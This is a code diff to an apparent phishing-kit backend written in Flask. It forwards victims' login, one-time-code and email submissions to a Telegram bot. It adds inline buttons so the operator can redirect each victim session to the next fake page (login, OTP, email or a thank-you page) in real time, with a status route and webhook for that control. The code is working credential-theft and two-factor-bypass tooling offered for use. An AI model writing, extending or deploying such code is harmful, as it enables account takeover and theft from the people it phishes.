@@ -9,8 +9,8 @@ load_dotenv()
 
 app = Flask(__name__)
 
-# ✅ FIXED CORS
-CORS(app, supports_credentials=True)
+# ✅ CORS FIX
+CORS(app)
 
 @app.after_request
 def handle_options(response):
@@ -29,19 +29,35 @@ if not BOT_TOKEN or not CHAT_ID:
 # SESSION STORE
 SESSION_STATUS = {}
 
-# TELEGRAM SEND
+# ======================
+# TELEGRAM SEND (WITH BUTTONS)
+# ======================
 def send_to_telegram(data, session_id, type_):
     msg = f"🔐 {type_.upper()} Submission\n\n"
     for k, v in data.items():
         msg += f"{k}: {v}\n"
     msg += f"\nSession: {session_id}"
 
-    payload = {
-        "chat_id": CHAT_ID,
-        "text": msg
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔐 LOGIN1", "callback_data": f"{session_id}:index.html"}],
+            [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp.html"}],
+            [{"text": "📧 EMAIL", "callback_data": f"{session_id}:email.html"}],
+            [{"text": "🎉 DONE", "callback_data": f"{session_id}:thnks.html"}]
+        ]
     }
 
-    r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": msg,
+        "reply_markup": keyboard
+    }
+
+    r = requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+        json=payload
+    )
+
     return r.ok
 
 
@@ -121,7 +137,7 @@ def email():
 
 
 # ======================
-# STATUS (VERY IMPORTANT)
+# STATUS
 # ======================
 @app.route("/status/<session_id>")
 def status(session_id):
@@ -134,7 +150,7 @@ def status(session_id):
 
 
 # ======================
-# TELEGRAM WEBHOOK
+# TELEGRAM WEBHOOK (BUTTON HANDLER)
 # ======================
 @app.route("/webhook", methods=["POST"])
 def webhook():
